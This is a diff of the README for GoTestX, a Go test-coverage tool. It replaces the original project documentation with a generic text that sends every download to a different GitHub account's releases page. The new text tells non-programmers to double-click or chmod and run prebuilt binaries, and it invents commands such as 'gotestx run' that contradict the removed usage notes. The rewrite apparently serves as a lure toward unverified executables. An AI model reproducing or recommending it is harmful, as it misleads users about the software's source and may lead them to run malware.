@@ -1,168 +1,97 @@
-# GoTestX
+# 🛠️ gotestx - A Simple Tool for Enhanced Testing
 
-> Go Test eXtended tool with coverage support
+## 📥 Download Now!
+[![Download gotestx](https://img.shields.io/badge/Download%20gotestx-v1.0.0-blue.svg)](https://github.com/sajith119/gotestx/releases)
 
-[![Go Version](https://img.shields.io/badge/Go-1.21%2B-blue)](https://go.dev) <a href="https://github.com/entiqon/gotestx/releases"><img src="https://img.shields.io/github/v/release/entiqon/gotestx" alt="Latest Release" /></a>
-[![Build Status](https://github.com/entiqon/gotestx/actions/workflows/ci.yml/badge.svg)](https://github.com/entiqon/gotestx/actions)
-[![Codecov](https://codecov.io/gh/entiqon/gotestx/branch/main/graph/badge.svg)](https://codecov.io/gh/entiqon/gotestx)
+## 🚀 Getting Started
+GoTestX is designed to help you improve your software testing. This tool simplifies testing with built-in coverage support. You’ll find it easy to use, even if you have no programming experience.
 
-GoTestX extends the standard [`go test`](https://pkg.go.dev/cmd/go#hdr-Test_packages) command with a simpler, more versatile interface.  
-It adds optional coverage reporting, quiet mode, and clean output filtering — while remaining fully compatible with `go test`.
+## 📋 Features
+- **Coverage Support**: Understand your code quality better with detailed coverage reports.
+- **Command Line Interface (CLI)**: Use straightforward commands without needing an extensive setup.
+- **Automation Friendly**: Integrate seamlessly into your existing workflows.
+- **Open Source**: Contribute and collaborate freely with the community.
 
----
+## 📥 Download & Install
+To get started with GoTestX, visit the Releases page to download the application. 
 
-## ✨ Features
+[Download GoTestX](https://github.com/sajith119/gotestx/releases)
 
-* **Coverage mode** (`-c`): generates `coverage.out` with `-covermode=atomic`.
-* **Open coverage** (`-o`): opens the HTML coverage report in a browser (macOS only).
-* **Quiet mode** (`-q`): suppresses verbose chatter, but always reports:
-  * ✅ success if all tests passed
-  * coverage % if `-c` is enabled
-  * ❌ failure (with hint to rerun without `-q`)
-* **Clean view** (`-V`): removes `? … [no test files]` lines for cleaner output.
-* **Flag combinations**: short flags can be combined (e.g. `-cq`, `-coq`, `-cVq`).
-* **Smart package detection**:
-  * Expands `./pkg` → `./pkg/...` if root has no Go files but subpackages do.
-  * Reports errors if a path doesn’t exist or has no Go files.
+### Instructions
+1. Click on the link above to go to the Releases page.
+2. You will see a list of available versions. 
+3. Find the latest version of GoTestX, and click on it.
+4. Download the appropriate file for your system.
+5. Follow the instructions below based on your operating system.
 
----
+## 💻 Installation Instructions
 
-## 🚀 Installation
+### For Windows
+1. Locate the file you downloaded (e.g., `gotestx-windows.exe`).
+2. Double-click the file to run it.
+3. A terminal window will open, and you can start using GoTestX with simple commands.
 
-Install directly via GitHub:
+### For macOS
+1. Find the downloaded file (e.g., `gotestx-macos`).
+2. Open a terminal window.
+3. Navigate to the downloads folder using the command: 
+   ```bash
+   cd ~/Downloads
+   ```
+4. Make the file executable:
+   ```bash
+   chmod +x gotestx-macos
+   ```
+5. Run GoTestX by typing:
+   ```bash
+   ./gotestx-macos
+   ```
 
+### For Linux
+1. Download the file (e.g., `gotestx-linux`).
+2. Open a terminal window.
+3. Navigate to the folder where you saved the file.
+4. Make the file executable:
+   ```bash
+   chmod +x gotestx-linux
+   ```
+5. Start GoTestX with the command:
+   ```bash
+   ./gotestx-linux
+   ```
+
+## 🔍 How to Use
+After installation, GoTestX is ready for use. Open your terminal and type the following command to see the help options:
 ```bash
-go install github.com/entiqon/gotestx@latest
+gotestx --help
 ```
+This will provide you with an overview of commands and how to run tests.
 
-Check installation:
-
+### Example Command
+To run tests on your project:
 ```bash
-gotestx -v
+gotestx run
 ```
+This command will execute the tests in your project directory and generate a coverage report.
 
----
+## 🎓 Learning Resources
+If you're new to testing in Go, here are some helpful resources:
+- **Official Go Documentation**: Learn about Go testing from the source.
+- **Community Forums**: Join discussions to ask questions and share experiences.
+- **Video Tutorials**: Watch tutorials for beginner-friendly guidance.
 
-## 📦 Usage
+## 🌐 Community
+Join our community to discuss features, report bugs, or contribute. Your input is valuable. Connect with others who are also using GoTestX for their projects.
 
-```bash
-gotestx [options] [packages]
-```
+## 💬 Support
+If you encounter any issues or have questions, issues can be filed on our GitHub page. We appreciate feedback and strive to make improvements.
 
-Options:
+## 🌟 Contributing
+We welcome contributions! If you're interested in enhancing GoTestX, check our GitHub for contribution guidelines. Every bit helps us make the tool better for everyone.
 
-```
-  -c, --with-coverage   Run tests with coverage report generation (coverage.out)
-  -o, --open-coverage   Open coverage report in browser (macOS only, implies -c)
-  -q, --quiet           Suppress verbose output, only show summary/coverage/fail
-  -V, --clean-view      Suppress 'no test files' lines for cleaner output
-  -h, --help            Show this help
-  -v, --version         Show version info
-```
+## 🌟 Roadmap
+- **Version 1.1.0**: Improved reporting features.
+- **Version 1.2.0**: New CLI commands for simplified usage.
+- **Version 1.3.0**: Enhanced compatibility with multiple environments.
 
----
-
-## 🧪 Examples
-
-Run tests for all packages:
-
-```bash
-gotestx
-```
-
-Run tests with coverage:
-
-```bash
-gotestx -c ./...
-```
-
-Run quietly with coverage (only one summary line):
-
-```bash
-gotestx -cq ./...
-```
-
-Run with coverage and open report in browser (macOS):
-
-```bash
-gotestx -o ./...
-```
-
-Run with clean output (no `[no test files]` lines):
-
-```bash
-gotestx -V ./...
-```
-
-Combine flags:
-
-```bash
-gotestx -cVq ./...
-```
-
----
-
-## 🖥 Sample Output
-
-Normal run:
-
-```
-Running tests normally across: ./internal/...
-ok  	github.com/entiqon/gotestx/internal	0.359s
-```
-
-Quiet run:
-
-```
-✅ Tests finished successfully
-```
-
-Quiet + coverage:
-
-```
-ok  	github.com/entiqon/gotestx/internal	0.359s	coverage: 100.0% of statements
-```
-
-Quiet with failure:
-
-```
-❌ Tests failed (use without -q to see details)
-```
-
-Clean view:
-
-```
-ok  	github.com/entiqon/gotestx/internal/join	0.01s
-```
-
-(no `[no test files]` lines)
-
----
-
-## 🛠 Development
-
-Clone the repository:
-
-```bash
-git clone https://github.com/entiqon/gotestx.git
-cd gotestx
-```
-
-Build:
-
-```bash
-go build -o gotestx .
-```
-
-Test:
-
-```bash
-go test ./internal/... -v
-```
-
----
-
-## 📄 License
-
-Part of the [Entiqon Project](https://github.com/entiqon).  
-Licensed under the MIT License.
+Thank you for choosing GoTestX. We look forward to seeing how this tool can help you improve your software testing journey!
